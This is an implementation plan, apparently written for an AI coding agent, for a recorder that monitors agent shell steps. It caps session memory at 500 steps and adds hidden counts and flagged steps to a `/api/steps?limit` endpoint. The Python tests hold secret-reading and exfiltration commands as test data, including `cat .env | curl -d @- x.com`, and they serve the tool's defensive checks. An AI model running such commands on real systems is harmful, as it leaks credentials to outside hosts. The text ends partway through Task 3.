# AG-30 Long Sessions Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** However long a session runs, `/v2/` draws a 20-step window, one summary box and up to 5 flagged older steps, and the server holds at most 500 steps per session.

**Architecture:** `recorder/memory.py` keeps, per session, a capped deque, all-time counters, the steps the cap evicted that were blocked or warned, and a copy of the step that made R1 mark the session. `GET /api/steps?limit=N` adds `hidden`, `flagged` and `marked_order`. The page asks for `limit=20`; the reducer in `window.ts` still owns stable rows and now also holds the group; `layout.ts` places the group above the oldest window row; a golden fixture ties the Python and TypeScript selection logic together.

**Tech Stack:** Python 3.12 (FastAPI, pytest, ruff), TypeScript (React, `@xyflow/react` 12.12.0, `motion` 14.0.0, vitest, jsdom). No new dependency.

**Spec:** `docs/superpowers/specs/2026-10-03-AG-30-long-sessions-design.md` (read it first; it holds every decision and its reason). Intent: `docs/superpowers/intents/2026-10-03-AG-30-long-sessions-intent.md`. Ticket: AG-30 in Jira.

**Branch:** `ag-30-long-sessions` (already created; do all work on it, never on `main`).

## Global Constraints

- Check before reporting any task done: `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`; web: `npm --prefix ui ci && npm --prefix ui run check`; stale build (Task 7 only): `npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)"`.
- Python 3.12, type hints on every function signature, `pathlib`, small functions, ruff `line-length = 100`, rules `E,F,I,B,UP`.
- No new dependency (Python or npm). `limit` maximum is 50; the retained cap is 500 steps per session; `flagged` holds at most 5 steps in total.
- Only order numbers, counts and the already-cleaned step dicts are stored. Never print request bodies. The marking-step capture and the counters run in the hook path and stay in memory: no scan, no network, no waiting.
- Positions come from a step's stable `row`, never from `order` (test with orders in the tens of thousands).
- 16 px text floor; every text colour pair is a row in `ui/src/graph/tones.ts` and passes 7:1 (`tones.test.ts` iterates the table). No colour utility class outside `tones.ts`.
- Group boxes and edges always mount quiet: no fade-in, no edge draw-in.
- Without `limit` the `/api/steps` response has exactly the keys it has today (`session`, `steps`).
- Vitest files that read the golden fixture use `readFileSync` with `/// <reference types="node" />` (the pattern in `layout.test.ts`), not a JSON import.
- Commit message ends with the trailer line `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>`.

## Review Focus

Inputs and conditions the spec implies that a person using the page is most likely to hit. Each has a test in the task named in brackets.

1. A `flagged` list that repeats an order, or that holds a step also in the window (a lagging poll, a buggy server): the page must not draw a duplicate node id. The window wins. [Task 4]
2. A different session id arriving while a group is drawn: no stale summary or flagged step from the old session may remain. [Task 3]
3. A server restart mid-session: `marked_order` becomes `null`, so the `SECRET` chip on the step disappears, but the header SECRET SEEN chip stays (it stays because `secretSeen` is sticky; the fallback rule has its own test). [Task 3]
4. A session with hidden steps but nothing to flag (no block, no warning, marking step still in the window): the summary box alone, with no edges. [Task 4]
5. A step kind the server does not know: it counts in `hidden.total` only, and the page's `hidden` still parses. [Task 1]

---

## File Structure

Create:
- `tests/test_memory.py`: unit tests for `parse_limit`, `pick_flagged`, the capped store and the golden fixture.
- `tests/fixtures/window_golden.json`: four scenarios with expected window, `hidden`, `flagged`, `marked_order`; read by pytest and vitest.
- `ui/src/graph/summary.ts` (+ `summary.test.ts`): the pure summary-box text.
- `ui/src/graph/mockWindow.ts` (+ `mockWindow.test.ts`): the mock's emulation of the server's `limit` view (`windowOfMock`, `pickFlagged`).

Modify:
- `recorder/memory.py` (rewritten), `recorder/app.py`, `tests/test_app.py`, `HOOKS.md`.
- `ui/src/graph/types.ts`, `snapshot.ts`, `window.ts`, `useRecorder.ts`, `layout.ts`, `camera.ts`, `nodes.tsx`, `tones.ts`, `GraphView.tsx`, `mock.ts`, `testing.ts`; `ui/src/App.tsx`; and their existing tests.
- `README.md`, `ui/README.md`, `SPEC.md` § 6, `ui/dist` (rebuilt).

Task order: 1 server memory, 2 server endpoint and docs, 3 page data, 4 layout and camera, 5 nodes and wiring, 6 mock, 7 docs and build. Tasks 1 and 2 are independent of 3 to 6. Do not reorder 3 to 6: each uses the previous one's types.

---

### Task 1: Server memory — capped store, counters, landmarks

**Files:**
- Modify: `recorder/memory.py` (full rewrite below)
- Create: `tests/test_memory.py`, `tests/fixtures/window_golden.json`

**Interfaces:**
- Consumes: `recorder.store.StepRecord` (existing).
- Produces (used by Task 2 and mirrored in Task 6):
  - `parse_limit(raw: str | None) -> int | None` (raises `ValueError`)
  - `pick_flagged(marking: Step | None, candidates: Iterable[Step], floor: int, cap: int = FLAG_CAP) -> list[Step]`
  - `MemorySteps(cap: int = RETAINED_CAP)` with `clear()`, `append_from_record(record, marks=False)`, `append_step(session_id, step, marks=False)`, `snapshot(*, all_steps=False, limit=None) -> dict[str, Any]`
  - constants `RETAINED_CAP = 500`, `MAX_LIMIT = 50`, `FLAG_CAP = 5`

- [ ] **Step 1: Write the golden fixture**

Create `tests/fixtures/window_golden.json` (orders are 1, 2, 3, … by position in `steps`; `marks` flags the step that made R1 mark the session). The expected values were checked by running the algorithm.

```json
{
  "scenarios": [
    {
      "name": "plain: marking and one block fall out of 8 retained",
      "cap": 8,
      "steps": [
        {"kind": "read", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed", "marks": true},
        {"kind": "edit", "verdict": "allowed"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "tool", "verdict": "allowed"},
        {"kind": "read", "verdict": "allowed"},
        {"kind": "shell", "verdict": "warned"},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "read", "verdict": "allowed"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "edit", "verdict": "allowed"},
        {"kind": "tool", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "blocked"}
      ],
      "cases": [
        {"limit": 3, "expect": {"window": [12, 13, 14], "hidden": {"total": 11, "read": 3, "shell": 5, "edit": 2, "tool": 1, "blocked": 2, "warned": 1}, "flagged": [2, 4, 7, 10], "marked_order": 2}},
        {"limit": 10, "expect": {"window": [7, 8, 9, 10, 11, 12, 13, 14], "hidden": {"total": 6, "read": 2, "shell": 2, "edit": 1, "tool": 1, "blocked": 1, "warned": 0}, "flagged": [2, 4], "marked_order": 2}},
        {"limit": 1, "expect": {"window": [14], "hidden": {"total": 13, "read": 3, "shell": 6, "edit": 2, "tool": 2, "blocked": 2, "warned": 1}, "flagged": [2, 4, 7, 10], "marked_order": 2}}
      ]
    },
    {
      "name": "marking step is evicted and was blocked: it appears once",
      "cap": 4,
      "steps": [
        {"kind": "read", "verdict": "allowed"},
        {"kind": "shell", "verdict": "blocked", "marks": true},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "warned"}
      ],
      "cases": [
        {"limit": 2, "expect": {"window": [5, 6], "hidden": {"total": 4, "read": 1, "shell": 3, "edit": 0, "tool": 0, "blocked": 1, "warned": 0}, "flagged": [2], "marked_order": 2}},
        {"limit": 10, "expect": {"window": [3, 4, 5, 6], "hidden": {"total": 2, "read": 1, "shell": 1, "edit": 0, "tool": 0, "blocked": 1, "warned": 0}, "flagged": [2], "marked_order": 2}}
      ]
    },
    {
      "name": "seven evictions of blocked steps keep the newest five; the cap-5 cut keeps marking plus four",
      "cap": 3,
      "steps": [
        {"kind": "shell", "verdict": "allowed", "marks": true},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "read", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"}
      ],
      "cases": [
        {"limit": 1, "expect": {"window": [11], "hidden": {"total": 10, "read": 1, "shell": 9, "edit": 0, "tool": 0, "blocked": 7, "warned": 0}, "flagged": [1, 5, 6, 7, 8], "marked_order": 1}},
        {"limit": 3, "expect": {"window": [9, 10, 11], "hidden": {"total": 8, "read": 0, "shell": 8, "edit": 0, "tool": 0, "blocked": 7, "warned": 0}, "flagged": [1, 5, 6, 7, 8], "marked_order": 1}}
      ]
    },
    {
      "name": "marking step in the window takes no slot; once outside it does and the oldest block drops",
      "cap": 20,
      "steps": [
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "blocked"},
        {"kind": "shell", "verdict": "allowed", "marks": true},
        {"kind": "shell", "verdict": "allowed"},
        {"kind": "shell", "verdict": "allowed"}
      ],
      "cases": [
        {"limit": 3, "expect": {"window": [7, 8, 9], "hidden": {"total": 6, "read": 0, "shell": 6, "edit": 0, "tool": 0, "blocked": 6, "warned": 0}, "flagged": [2, 3, 4, 5, 6], "marked_order": 7}},
        {"limit": 2, "expect": {"window": [8, 9], "hidden": {"total": 7, "read": 0, "shell": 7, "edit": 0, "tool": 0, "blocked": 6, "warned": 0}, "flagged": [3, 4, 5, 6, 7], "marked_order": 7}}
      ]
    }
  ]
}
```

- [ ] **Step 2: Write the failing tests**

Create `tests/test_memory.py`:

```python
"""Unit tests for the capped in-memory step store and its `limit` view."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from recorder.memory import MAX_LIMIT, MemorySteps, parse_limit, pick_flagged
from recorder.store import StepRecord

FIXTURE: Path = Path(__file__).parent / "fixtures" / "window_golden.json"
ZERO_HIDDEN: dict[str, int] = dict.fromkeys(
    ("total", "read", "shell", "edit", "tool", "blocked", "warned"), 0
)


def make_step(order: int, kind: str = "shell", verdict: str = "allowed") -> dict[str, Any]:
    return {
        "order": order,
        "kind": kind,
        "verdict": verdict,
        "tool": None,
        "file": None,
        "sensitive": False,
        "command": None,
        "host": None,
        "rule": None,
    }


def orders(steps: list[dict[str, Any]]) -> list[int]:
    return [s["order"] for s in steps]


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        (None, None),
        ("1", 1),
        ("20", 20),
        ("50", 50),
        ("51", 50),
        ("80", 50),
        ("10000", 50),
        ("007", 7),
        ("0" * 5000 + "7", 7),
        ("9" * 5000, MAX_LIMIT),
    ],
)
def test_parse_limit_accepts(raw: str | None, expected: int | None) -> None:
    assert parse_limit(raw) == expected


@pytest.mark.parametrize(
    "raw",
    ["", "0", "00", "0" * 5000, "-1", "abc", "+5", " 5", "5 ", "5_0", "1.5", "٣"],
)
def test_parse_limit_rejects(raw: str) -> None:
    with pytest.raises(ValueError, match="bad limit"):
        parse_limit(raw)


def test_pick_flagged_takes_marking_then_the_newest_four() -> None:
    candidates = [make_step(o, verdict="blocked") for o in (20, 18, 16, 14, 12, 10)]
    got = pick_flagged(make_step(3), iter(candidates), floor=30)
    assert orders(got) == [3, 14, 16, 18, 20]


def test_pick_flagged_marking_inside_the_window_takes_no_slot() -> None:
    candidates = [make_step(o, verdict="blocked") for o in (20, 18, 16, 14, 12, 10)]
    got = pick_flagged(make_step(35), iter(candidates), floor=30)
    assert orders(got) == [12, 14, 16, 18, 20]


def test_pick_flagged_counts_a_marking_step_that_is_also_blocked_once() -> None:
    marking = make_step(3, verdict="blocked")
    got = pick_flagged(marking, iter([make_step(9, verdict="blocked"), marking]), floor=30)
    assert orders(got) == [3, 9]


def test_pick_flagged_skips_steps_at_or_above_the_floor_and_sorts_ascending() -> None:
    candidates = [make_step(o, verdict="warned") for o in (40, 30, 29, 5)]
    assert orders(pick_flagged(None, iter(candidates), floor=30)) == [5, 29]


def test_pick_flagged_with_nothing_is_empty() -> None:
    assert pick_flagged(None, iter([]), floor=10) == []


def test_cap_drops_the_oldest_but_counters_keep_counting() -> None:
    store = MemorySteps(cap=5)
    for order in range(1, 13):
        store.append_step("s", make_step(order))
    full = store.snapshot(all_steps=True)
    assert orders(full["steps"]) == [8, 9, 10, 11, 12]
    view = store.snapshot(limit=2)
    assert orders(view["steps"]) == [11, 12]
    assert view["hidden"]["total"] == 10
    assert view["hidden"]["shell"] == 10


def test_an_unknown_kind_counts_only_in_total() -> None:
    store = MemorySteps()
    store.append_step("s", make_step(1, kind="weird"))
    store.append_step("s", make_step(2))
    view = store.snapshot(limit=1)
    assert view["hidden"] == {**ZERO_HIDDEN, "total": 1}


def test_limit_above_the_retained_count_shows_everything_and_hides_nothing() -> None:
    store = MemorySteps()
    for order in range(1, 4):
        store.append_step("s", make_step(order, verdict="blocked"))
    view = store.snapshot(limit=50)
    assert orders(view["steps"]) == [1, 2, 3]
    assert view["hidden"] == ZERO_HIDDEN
    assert view["flagged"] == []
    assert view["marked_order"] is None


def test_only_the_first_marking_step_is_kept() -> None:
    store = MemorySteps()
    store.append_step("s", make_step(1), marks=True)
    store.append_step("s", make_step(2), marks=True)
    store.append_step("s", make_step(3))
    assert store.snapshot(limit=1)["marked_order"] == 1


def test_without_limit_the_snapshot_is_the_old_shape() -> None:
    store = MemorySteps()
    for order in range(1, 13):
        store.append_step("s", make_step(order))
    body = store.snapshot()
    assert set(body) == {"session", "steps"}
    assert orders(body["steps"]) == list(range(3, 13))
    assert orders(store.snapshot(all_steps=True)["steps"]) == list(range(1, 13))
    assert store.snapshot(limit=None, all_steps=True)["session"] == "s"


def test_empty_store() -> None:
    store = MemorySteps()
    assert store.snapshot() == {"session": None, "steps": []}
    assert store.snapshot(limit=20) == {
        "session": None,
        "steps": [],
        "hidden": ZERO_HIDDEN,
        "flagged": [],
        "marked_order": None,
    }


def test_clear_forgets_everything() -> None:
    store = MemorySteps()
    store.append_step("s", make_step(1), marks=True)
    store.clear()
    assert store.snapshot(limit=5)["session"] is None


def test_append_from_record_keeps_the_step_shape_and_takes_marks() -> None:
    record = StepRecord(
        session_id="s",
        started_at="t",
        order=4,
        time="t",
        kind="read",
        verdict="allowed",
        file_path=".env",
        file_sensitive=True,
    )
    store = MemorySteps()
    store.append_from_record(record, marks=True)
    view = store.snapshot(limit=1)
    expected_keys = {
        "order",
        "kind",
        "verdict",
        "tool",
        "file",
        "sensitive",
        "command",
        "host",
        "rule",
    }
    assert set(view["steps"][0]) == expected_keys
    assert view["marked_order"] == 4


def _scenarios() -> list[dict[str, Any]]:
    return json.loads(FIXTURE.read_text(encoding="utf-8"))["scenarios"]


@pytest.mark.parametrize("scenario", _scenarios(), ids=lambda s: s["name"][:40])
def test_golden_scenarios(scenario: dict[str, Any]) -> None:
    store = MemorySteps(cap=scenario["cap"])
    for order, spec in enumerate(scenario["steps"], start=1):
        store.append_step(
            "g", make_step(order, spec["kind"], spec["verdict"]), marks=bool(spec.get("marks"))
        )
    for case in scenario["cases"]:
        got = store.snapshot(limit=case["limit"])
        want = case["expect"]
        assert orders(got["steps"]) == want["window"], case
        assert got["hidden"] == want["hidden"], case
        assert orders(got["flagged"]) == want["flagged"], case
        assert got["marked_order"] == want["marked_order"], case
```

- [ ] **Step 3: Run the tests to verify they fail**

Run: `uv run pytest tests/test_memory.py -q`
Expected: collection error / FAIL with `ImportError: cannot import name 'MAX_LIMIT' from 'recorder.memory'`.

- [ ] **Step 4: Rewrite `recorder/memory.py`**

Replace the whole file:

```python
"""In-memory cleaned steps for the live graph page (SPEC §4 JSON shape)."""

from __future__ import annotations

import threading
from collections import deque
from collections.abc import Iterable, Iterator
from dataclasses import dataclass, field
from typing import Any

from recorder.store import StepRecord

Step = dict[str, Any]

_LAST_N: int = 10
RETAINED_CAP: int = 500
MAX_LIMIT: int = 50
FLAG_CAP: int = 5
# int() of up to this many digits is always safe; more digits is above MAX_LIMIT.
_MAX_LIMIT_DIGITS: int = 4
_KINDS: tuple[str, ...] = ("read", "shell", "edit", "tool")
_COUNT_KEYS: tuple[str, ...] = ("total", *_KINDS, "blocked", "warned")
_ALARMS: frozenset[str] = frozenset({"blocked", "warned"})


def parse_limit(raw: str | None) -> int | None:
    """None when absent; 1..MAX_LIMIT when valid (a larger count is MAX_LIMIT); else ValueError."""
    if raw is None:
        return None
    if not (raw.isascii() and raw.isdigit()):
        raise ValueError("bad limit")
    digits: str = raw.lstrip("0")
    if digits == "":
        raise ValueError("bad limit")
    if len(digits) > _MAX_LIMIT_DIGITS:
        return MAX_LIMIT
    return min(int(digits), MAX_LIMIT)


def pick_flagged(
    marking: Step | None,
    candidates: Iterable[Step],
    floor: int,
    cap: int = FLAG_CAP,
) -> list[Step]:
    """Up to `cap` landmark steps below `floor`, ascending by order.

    The marking step comes first, and only once it is below the window floor. The
    candidates (blocked or warned steps, newest first) fill the rest. A step that is
    both counts once.
    """
    picked: dict[int, Step] = {}
    if marking is not None and marking["order"] < floor:
        picked[marking["order"]] = marking
    for step in candidates:
        if len(picked) >= cap:
            break
        if step["order"] < floor and step["order"] not in picked:
            picked[step["order"]] = step
    return [picked[order] for order in sorted(picked)]


def _empty_counts() -> dict[str, int]:
    return dict.fromkeys(_COUNT_KEYS, 0)


def _count(counts: dict[str, int], step: Step) -> None:
    counts["total"] += 1
    if step["kind"] in _KINDS:
        counts[step["kind"]] += 1
    if step["verdict"] in _ALARMS:
        counts[step["verdict"]] += 1


def _empty_view() -> dict[str, Any]:
    return {"hidden": _empty_counts(), "flagged": [], "marked_order": None}


@dataclass
class _Session:
    """One session's memory: the retained steps and what the cap must not lose."""

    cap: int
    steps: deque[Step] = field(default_factory=deque)
    counts: dict[str, int] = field(default_factory=_empty_counts)
    evicted_flagged: deque[Step] = field(default_factory=lambda: deque(maxlen=FLAG_CAP))
    marking: Step | None = None

    def append(self, step: Step, marks: bool) -> None:
        if len(self.steps) >= self.cap:
            gone: Step = self.steps.popleft()
            if gone["verdict"] in _ALARMS:
                self.evicted_flagged.append(gone)
        self.steps.append(step)
        _count(self.counts, step)
        if marks and self.marking is None:
            self.marking = step

    def _alarms_below(self, floor: int) -> Iterator[Step]:
        """Blocked or warned steps below `floor`, newest first (retained, then evicted)."""
        for step in reversed(self.steps):
            if step["order"] < floor and step["verdict"] in _ALARMS:
                yield step
        yield from reversed(self.evicted_flagged)

    def window_view(self, limit: int) -> dict[str, Any]:
        window: list[Step] = list(self.steps)[-limit:]
        floor: int = window[0]["order"]
        in_window: dict[str, int] = _empty_counts()
        for step in window:
            _count(in_window, step)
        return {
            "steps": window,
            "hidden": {key: self.counts[key] - in_window[key] for key in _COUNT_KEYS},
            "flagged": pick_flagged(self.marking, self._alarms_below(floor), floor),
            "marked_order": None if self.marking is None else self.marking["order"],
        }


def _step_dict(record: StepRecord) -> Step:
    return {
        "order": record.order,
        "kind": record.kind,
        "verdict": record.verdict,
        "tool": record.tool,
        "file": record.file_path,
        "sensitive": record.file_sensitive,
        "command": record.command,
        "host": record.hosts[0] if record.hosts else None,
        "rule": record.rule_id,
    }


class MemorySteps:
    """Thread-safe per-session step memory for GET /api/steps."""

    def __init__(self, cap: int = RETAINED_CAP) -> None:
        self._lock: threading.Lock = threading.Lock()
        self._cap: int = cap
        self.current_session_id: str | None = None
        self._sessions: dict[str, _Session] = {}

    def clear(self) -> None:
        with self._lock:
            self.current_session_id = None
            self._sessions.clear()

    def append_from_record(self, record: StepRecord, marks: bool = False) -> None:
        self.append_step(record.session_id, _step_dict(record), marks)

    def append_step(self, session_id: str, step: Step, marks: bool = False) -> None:
        with self._lock:
            memory: _Session = self._sessions.setdefault(session_id, _Session(cap=self._cap))
            memory.append(step, marks)
            self.current_session_id = session_id

    def snapshot(self, *, all_steps: bool = False, limit: int | None = None) -> dict[str, Any]:
        with self._lock:
            sid: str | None = self.current_session_id
            if sid is None:
                body: dict[str, Any] = {"session": None, "steps": []}
                return body if limit is None else {**body, "steps": [], **_empty_view()}
            memory: _Session = self._sessions[sid]
            if limit is None:
                steps: list[Step] = list(memory.steps)
                return {"session": sid, "steps": steps if all_steps else steps[-_LAST_N:]}
            return {"session": sid, **memory.window_view(limit)}


memory_steps: MemorySteps = MemorySteps()
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `uv run pytest tests/test_memory.py -q`
Expected: all pass (about 40 cases).

- [ ] **Step 6: Run the full Python check**

Run: `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`
Expected: pass. If `ruff format --check` flags a file, run `uv run ruff format .` and re-run the check (the formatter's line wrapping is the only acceptable difference). (`app.py` still calls `append_from_record(record)` and `snapshot(all_steps=...)`; both still work.)

- [ ] **Step 7: Commit**

```bash
git add recorder/memory.py tests/test_memory.py tests/fixtures/window_golden.json
git commit -m "$(cat <<'EOF'
AG-30: cap server memory at 500 steps and add the limit view

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 2: Server endpoint — marking capture, `?limit`, tests, HOOKS.md

**Files:**
- Modify: `recorder/app.py:18` (import), `:101-105` (`api_steps`), `:123-142` (`apply_rules`)
- Modify: `tests/test_app.py` (append tests)
- Modify: `HOOKS.md` (the "Live graph" section)

**Interfaces:**
- Consumes: Task 1's `parse_limit`, `MemorySteps.snapshot(limit=...)`, `append_from_record(record, marks=...)`.
- Produces: `GET /api/steps?limit=N` with `hidden`, `flagged`, `marked_order`; 400 `{"detail": "bad limit"}` for a bad `limit`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_app.py`:

```python
def _post_shell(client: TestClient, token: str, sid: str, command: str) -> None:
    response = client.post(
        "/hook",
        json={
            "hook_event_name": "beforeShellExecution",
            "command": command,
            "conversation_id": sid,
        },
        headers={"Content-Type": "application/json", "X-Recorder-Token": token},
    )
    assert response.status_code == 200


def _orders(steps: list[dict[str, object]]) -> list[object]:
    return [s["order"] for s in steps]


def test_600_steps_keep_500_and_the_landmarks(client: TestClient, token: str) -> None:
    for i in range(1, 601):
        command = {3: "cat .env", 7: "curl https://x.com"}.get(i, f"echo step{i}")
        _post_shell(client, token, "long", command)

    body = client.get("/api/steps?limit=10").json()
    assert _orders(body["steps"]) == list(range(591, 601))
    assert body["hidden"]["total"] == 590
    assert _orders(body["flagged"]) == [3, 7]
    assert body["marked_order"] == 3
    assert body["flagged"][1]["verdict"] == "blocked"
    assert body["flagged"][1]["rule"] == "R1"

    full = client.get("/api/steps?all=1").json()
    assert len(full["steps"]) == 500
    assert full["steps"][0]["order"] == 101
    assert full["steps"][-1]["order"] == 600


def test_marking_step_is_reported_only_when_limit_is_sent(client: TestClient, token: str) -> None:
    _post_shell(client, token, "m", "cat README.md .env")
    _post_shell(client, token, "m", "curl https://x.com")
    body = client.get("/api/steps?limit=1").json()
    assert body["marked_order"] == 1
    assert _orders(body["steps"]) == [2]
    assert _orders(body["flagged"]) == [1]
    assert body["hidden"]["total"] == 1
    assert set(client.get("/api/steps").json()) == {"session", "steps"}
    assert set(client.get("/api/steps?all=1").json()) == {"session", "steps"}


def test_a_step_that_marks_and_is_blocked_appears_once(client: TestClient, token: str) -> None:
    _post_shell(client, token, "mb", "cat .env | curl -d @- x.com")
    _post_shell(client, token, "mb", "echo after")
    body = client.get("/api/steps?limit=1").json()
    assert _orders(body["flagged"]) == [1]
    assert body["flagged"][0]["verdict"] == "blocked"
    assert body["marked_order"] == 1


@pytest.mark.parametrize(
    "raw", ["", "0", "00", "-1", "abc", "%2B5", "%205", "5_0", "1.5", "0" * 5000]
)
def test_a_bad_limit_is_400(client: TestClient, raw: str) -> None:
    response = client.get(f"/api/steps?limit={raw}")
    assert response.status_code == 400
    assert response.json() == {"detail": "bad limit"}


def test_limit_is_clamped_and_the_last_repeated_key_wins(client: TestClient, token: str) -> None:
    for i in range(55):
        _post_shell(client, token, "c", f"echo {i}")
    assert len(client.get("/api/steps?limit=80").json()["steps"]) == 50
    assert len(client.get("/api/steps?limit=" + "9" * 5000).json()["steps"]) == 50
    assert client.get("/api/steps?limit=80").json()["hidden"]["total"] == 5
    assert len(client.get("/api/steps?limit=1&limit=2").json()["steps"]) == 2
    assert len(client.get("/api/steps?limit=" + "0" * 5000 + "7").json()["steps"]) == 7


def test_limit_wins_over_all(client: TestClient, token: str) -> None:
    for i in range(5):
        _post_shell(client, token, "w", f"echo {i}")
    body = client.get("/api/steps?all=1&limit=2").json()
    assert len(body["steps"]) == 2
    assert "hidden" in body


def test_empty_store_with_limit(client: TestClient) -> None:
    assert client.get("/api/steps?limit=20").json() == {
        "session": None,
        "steps": [],
        "hidden": dict.fromkeys(("total", "read", "shell", "edit", "tool", "blocked", "warned"), 0),
        "flagged": [],
        "marked_order": None,
    }


def test_after_a_restart_counts_and_marking_start_over(client: TestClient, token: str) -> None:
    from recorder.memory import memory_steps

    _post_shell(client, token, "r", "cat .env")
    _post_shell(client, token, "r", "echo a")
    memory_steps.clear()  # what a restart does to memory; sessions.json keeps the mark
    _post_shell(client, token, "r", "echo b")
    _post_shell(client, token, "r", "echo c")
    body = client.get("/api/steps?limit=1").json()
    assert _orders(body["steps"]) == [4]
    assert body["marked_order"] is None
    assert body["hidden"]["total"] == 1
```

- [ ] **Step 2: Run to verify they fail**

Run: `uv run pytest tests/test_app.py -q -k "600_steps or marking_step or marks_and or bad_limit or clamped or limit_wins or empty_store_with or restart"`
Expected: FAIL (no `hidden` key / status 200 instead of 400).

- [ ] **Step 3: Wire `app.py`**

Change the import (line 18):

```python
from recorder.memory import memory_steps, parse_limit
```

Replace `api_steps` (lines 101-105):

```python
@app.get("/api/steps")
async def api_steps(request: Request) -> JSONResponse:
    try:
        limit: int | None = parse_limit(request.query_params.get("limit"))
    except ValueError:
        return JSONResponse({"detail": "bad limit"}, status_code=400)
    all_flag: str = str(request.query_params.get("all", "") or "")
    all_steps: bool = all_flag in {"1", "true", "yes"}
    return JSONResponse(memory_steps.snapshot(all_steps=all_steps, limit=limit))
```

In `apply_rules`, read the mark state before `mark()` and pass it on. Replace

```python
    session: Session = store.get_or_create(session_id)

    session = mark(payload, session)
```

with

```python
    session: Session = store.get_or_create(session_id)

    was_marked: bool = session.marked
    session = mark(payload, session)
    marks: bool = session.marked and not was_marked
```

and replace `memory_steps.append_from_record(record)` with

```python
    memory_steps.append_from_record(record, marks=marks)
```

- [ ] **Step 4: Run to verify they pass**

Run: `uv run pytest tests/test_app.py -q`
Expected: all pass, including the existing `test_api_steps_all_returns_more_than_ten`. (The 600-step test makes 600 `/hook` calls and writes `sessions.json` each time; a few seconds is normal.)

- [ ] **Step 5: Update `HOOKS.md`**

In the "Live graph" section replace

```
  [`ui/`](ui/) build served at `/v2/` (Vite + React; a timeline of the last 20
  steps it has seen; `/v2/?mock=1` replays a sample session with no server).
```

with

```
  [`ui/`](ui/) build served at `/v2/` (Vite + React; a timeline of the 20 most
  recent steps with, above them, a summary box and up to 5 flagged older steps;
  `/v2/?mock=1` replays a sample session with no server).
```

Replace

```
- `GET /api/steps` → `{session, steps}` for the **most recent** session,
  last 10 cleaned steps from process memory. `?all=1` returns the full list
  for that session (checks only).
```

with

```
- `GET /api/steps` → `{session, steps}` for the **most recent** session,
  last 10 cleaned steps from process memory. `?all=1` returns every retained
  step for that session (checks only). Memory keeps at most 500 steps per
  session (oldest dropped; order numbers keep counting).
- `GET /api/steps?limit=N` (1 to 50; a larger count is 50) returns the last N
  steps plus three more fields:
  - `hidden`: counts of the session's steps outside that window, including steps
    dropped by the 500 cap: `total`, `read`, `shell`, `edit`, `tool`,
    `blocked`, `warned`. `blocked` and `warned` overlay the kind counts; they are
    not a partition.
  - `flagged`: up to 5 older landmark steps in total, ascending by order, same
    step shape: the step that made R1 mark the session once it is outside the
    window, then the newest blocked or warned steps outside it (a step that is
    both appears once). `hidden.blocked` can exceed the blocked steps in
    `flagged`; the counts are truthful and the cap is for drawing.
  - `marked_order`: the order of the step that made R1 mark the session (not the
    first step with `sensitive`, which misses `cat README.md .env`), or `null`.
    After a server restart the session is still marked but memory is empty, so
    it is `null` and the counts start from zero.
  - `limit` must be ASCII digits and at least 1; anything else (`limit=`, `0`,
    `-1`, `abc`, `+5`) is 400 `{"detail": "bad limit"}`. A repeated key takes the
    last value. With `all=1`, `limit` wins. Without `limit` the body has only
    `session` and `steps`.
```

Replace

```
- Empty state: `{"session": null, "steps": []}`. Memory clears on server
  restart (lifespan).
```

with

```
- Empty state: `{"session": null, "steps": []}`; with `limit`, also
  `hidden` (all zeros), `flagged: []` and `marked_order: null`. Memory clears
  on server restart (lifespan).
```

- [ ] **Step 6: Run the full Python check and commit**

Run: `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`
Expected: pass. If `ruff format --check` flags a file, run `uv run ruff format .` and re-run the check.

```bash
git add recorder/app.py tests/test_app.py HOOKS.md
git commit -m "$(cat <<'EOF'
AG-30: serve hidden counts, flagged steps and the marking step behind ?limit

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 3: Page data — types, parsing, reducer, request

**Files:**
- Modify: `ui/src/graph/types.ts`, `snapshot.ts`, `window.ts` (full replacement below), `useRecorder.ts`, `testing.ts`
- Modify tests: `snapshot.test.ts`, `window.test.ts`, `useRecorder.test.tsx`, `../App.test.tsx`

**Interfaces:**
- Consumes: the API shape from Task 2.
- Produces (used by Tasks 4 to 6):
  - `types.ts`: `Hidden`, `Group { hidden: Hidden; flagged: readonly Step[] }`, `Snapshot` gains `hidden: Hidden | null`, `flagged: Step[]`, `markedOrder: number | null`
  - `WindowState` gains `group: Group | null` (null unless `hidden.total > 0`) and `markedOrder: number | null`
  - `WindowAction` snapshot gains optional `hidden`, `flagged`, `markedOrder`
  - `Recorder` gains `group: Group | null` and `markedOrder: number | null`
  - `testing.ts`: `makeHidden(over?: Partial<Hidden>): Hidden`

- [ ] **Step 1: Add the types and the test helper**

